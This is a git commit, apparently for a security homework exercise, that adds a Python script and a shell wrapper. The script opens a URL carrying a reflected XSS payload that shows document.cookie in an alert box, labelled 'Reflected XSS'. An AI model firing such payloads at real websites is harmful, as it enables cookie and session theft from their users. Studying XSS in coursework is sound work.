b8fe3181602a974f0e0928a63bbb6a2d02d80a33
Lam YongXian <yongxian@lam.sg>
2022-04-03 14:10:31 +0800

    Add case04

---
+++ case04.py
@@ -0,0 +1,5 @@
+import webbrowser
+url = 'http://www.wsb.com/Homework3/case04.php?name=<svg/onload=alert(document.cookie)>'
+
+new = 2 #open in new window
+webbrowser.open(url,new=new)
---
+++ case04.sh
@@ -0,0 +1,8 @@
+# Bug Category: Reflected XSS (1)
+
+# The logic of the php is: 
+
+# Exploit: 
+
+#!/bin/bash
+python3 case04.py
